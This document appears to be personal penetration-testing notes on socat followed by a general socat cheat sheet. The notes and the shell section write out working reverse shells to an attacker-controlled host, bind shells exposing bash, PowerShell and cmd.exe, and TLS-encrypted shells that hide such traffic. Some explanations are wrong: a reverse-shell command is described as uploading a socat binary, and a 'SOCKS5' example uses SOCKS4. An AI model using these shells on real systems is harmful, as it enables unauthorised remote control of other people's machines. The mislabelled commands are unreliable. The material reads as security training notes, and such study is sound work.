similar to [[Netcat]] but with more robust features

## Basic [[Reverse Shell]] Listener:

```bash
socat TCP-L:<port> -
```
equivalent to `nc -lvnp PORT_NUMBER`

On windows, we will run:
```powershell
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
to connect back

Linux equivalent:
```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

## Setting up a [[Bind Shell]]:

Run the following on a linux target:
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```

Windows equivalent:
```powershell
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Run this command on our system:
```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

## Stabilising a [[Shell]]:

This command initiates a stable shell session
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

This command uploads a precompiled `socat` binary to the target machine:
```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

![[Pasted image 20260506095748.png]]

## How to encrypt [[Shell]] sessions in `socat`

1. Generate certificate on the attacking machine - `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`. This command creates a 2048 bit [[RSA]] key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
2. Merge the two created files into a single `.pem` file - `cat shell.key shell.crt > shell.pem`
3. Set up [[Reverse Shell]] listener - `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` 
4. Connect back using `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
5. For [[Bind Shell]] -
	1. Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
	2. Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

![[Pasted image 20260507091407.png]]

![[Pasted image 20260507092426.png]]

# socat Cheat Sheet

## Basic Syntax

```
socat [OPTIONS] ADDRESS1 ADDRESS2
```

socat connects two bidirectional data streams. Data flows between ADDRESS1 and ADDRESS2 in both directions.

---

## Address Types

|Address|Description|
|---|---|
|`STDIN` / `STDOUT`|Standard input/output|
|`TCP:host:port`|TCP connection to host:port|
|`TCP-LISTEN:port`|Listen for TCP connection|
|`UDP:host:port`|UDP connection|
|`UDP-LISTEN:port`|Listen for UDP|
|`UNIX:path`|Connect to Unix domain socket|
|`UNIX-LISTEN:path`|Listen on Unix domain socket|
|`FILE:path`|Open a file|
|`PIPE:path`|Open a named pipe|
|`PTY`|Pseudo-terminal|
|`EXEC:cmd`|Execute a command|
|`SYSTEM:cmd`|Execute via shell|
|`OPENSSL:host:port`|SSL/TLS connection|
|`OPENSSL-LISTEN:port`|SSL/TLS listener|
|`/dev/ttyS0`|Serial device|

---

## Common Options

|Option|Description|
|---|---|
|`-v`|Verbose: print data to stderr (text)|
|`-x`|Verbose: print data to stderr (hex)|
|`-d`|Increase verbosity (use up to `-dddd`)|
|`-l`|Log to syslog|
|`-lf FILE`|Log to file|
|`-T seconds`|Inactivity timeout|
|`-t seconds`|Shutdown timeout|
|`-u`|Unidirectional (ADDRESS1 → ADDRESS2 only)|
|`-U`|Unidirectional (ADDRESS2 → ADDRESS1 only)|

---

## Address Options (appended with `,`)

|Option|Description|
|---|---|
|`fork`|Fork a new process for each connection|
|`reuseaddr`|Allow reuse of local address|
|`bind=addr`|Bind to a specific local address|
|`crnl`|Convert `\n` to `\r\n`|
|`append`|Append to file instead of overwrite|
|`wait`|Wait for connection before proceeding|
|`keepalive`|Enable TCP keepalive|
|`nodelay`|Disable Nagle algorithm (TCP)|
|`pty,raw,echo=0`|Raw PTY (for shell sessions)|

---

## TCP / Networking

```bash
# Simple TCP client
socat - TCP:example.com:80

# Simple TCP server (single connection)
socat TCP-LISTEN:8080 -

# TCP server (handle multiple connections)
socat TCP-LISTEN:8080,fork,reuseaddr -

# TCP port forwarder
socat TCP-LISTEN:8080,fork,reuseaddr TCP:target.host:80

# Connect and send HTTP request
echo -e "GET / HTTP/1.0\r\n\r\n" | socat - TCP:example.com:80

# Relay between two remote hosts
socat TCP:host1:1234 TCP:host2:5678
```

---

## UDP

```bash
# UDP client
socat - UDP:host:5005

# UDP listener
socat UDP-LISTEN:5005 -

# UDP port forwarder
socat UDP-LISTEN:5005,fork UDP:target:5005

# Send a single UDP message
echo "hello" | socat - UDP:host:5005
```

---

## SSL / TLS

```bash
# SSL client (skip verification)
socat - OPENSSL:host:443,verify=0

# SSL server with cert and key
socat OPENSSL-LISTEN:4443,cert=server.pem,key=server.key,verify=0 -

# Generate a self-signed cert for use with socat
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
cat server.crt server.key > server.pem

# SSL port forwarder (terminate and re-wrap)
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:backend:80
```

---

## Unix Domain Sockets

```bash
# Connect to a Unix socket
socat - UNIX:/var/run/app.sock

# Listen on a Unix socket
socat UNIX-LISTEN:/tmp/test.sock -

# Forward Unix socket to TCP
socat UNIX-LISTEN:/tmp/app.sock,fork TCP:localhost:8080

# Forward TCP to Unix socket
socat TCP-LISTEN:8080,fork UNIX:/var/run/docker.sock
```

---

## File & Pipe

```bash
# Read from file and send over TCP
socat FILE:data.bin TCP:host:1234

# Receive over TCP and write to file
socat TCP-LISTEN:1234 FILE:output.bin,create

# Write to a named pipe
socat - PIPE:/tmp/mypipe

# Append received data to a file
socat TCP-LISTEN:9000 FILE:/var/log/received.log,append
```

---

## Shell & Command Execution

```bash
# Expose a shell over TCP (DANGEROUS — lab use only)
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# Reverse shell — attacker listens:
socat TCP-LISTEN:4444 -
# Victim connects:
socat TCP:attacker:4444 EXEC:/bin/bash,pty,stderr,setsid

# Execute a command and return output
socat - EXEC:"ls -la"

# Interactive shell over TCP with PTY
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Connect to it with:
socat FILE:`tty`,raw,echo=0 TCP:host:4444
```

---

## Serial / TTY

```bash
# Connect two serial ports together
socat /dev/ttyS0,raw,echo=0 /dev/ttyS1,raw,echo=0

# Serial port to TCP bridge
socat /dev/ttyUSB0,raw,b9600 TCP-LISTEN:5000,fork

# TCP to serial port
socat TCP:host:5000 /dev/ttyUSB0,raw,b9600

# Create a virtual serial port pair (PTY)
socat PTY,link=/dev/virtualS0,raw PTY,link=/dev/virtualS1,raw
```

---

## Proxying & Tunnelling

```bash
# HTTP proxy tunnel
socat TCP-LISTEN:8080,fork TCP:proxy.host:3128

# Bidirectional pipe between two processes
socat EXEC:"process1" EXEC:"process2"

# SOCKS5 proxy (connect through)
socat TCP-LISTEN:1080,fork SOCKS4:proxy:target.host:80,socksport=1080

# Expose Docker socket over TCP
socat TCP-LISTEN:2375,fork UNIX:/var/run/docker.sock
```

---

## Debugging & Inspection

```bash
# Inspect raw traffic between client and server (text)
socat -v TCP-LISTEN:8080,fork TCP:target:80

# Inspect in hex
socat -x TCP-LISTEN:8080,fork TCP:target:80

# Log traffic to file
socat -v -lf traffic.log TCP-LISTEN:8080,fork TCP:target:80

# Timestamp each line in verbose output
socat -v -d -d TCP-LISTEN:8080,fork TCP:target:80 2>&1 | ts
```

---

## Practical Recipes

```bash
# Simple chat between two terminals
# Terminal 1:
socat TCP-LISTEN:5000 -
# Terminal 2:
socat - TCP:localhost:5000

# Transfer a file
# Receiver:
socat TCP-LISTEN:9000 FILE:received_file,create
# Sender:
socat FILE:myfile.tar.gz TCP:receiver:9000

# Quick TCP port check
socat /dev/null TCP:host:22

# Broadcast UDP to all LAN hosts
socat - UDP-DATAGRAM:255.255.255.255:5000,broadcast

# Multiplexed listener (one port, many clients)
socat TCP-LISTEN:9000,fork,reuseaddr SYSTEM:"cat /etc/hostname"
```

---

## Tips

- Always use `fork` on listeners to handle multiple clients without blocking
- Use `reuseaddr` to avoid "address already in use" errors on restart
- `pty,raw,echo=0` gives a proper interactive terminal feel over network shells
- Combine with `openssl` for encrypted channels without a VPN
- socat is often available as a static binary — useful for restricted environments
- Use `-d -d` for verbose debug output during troubleshooting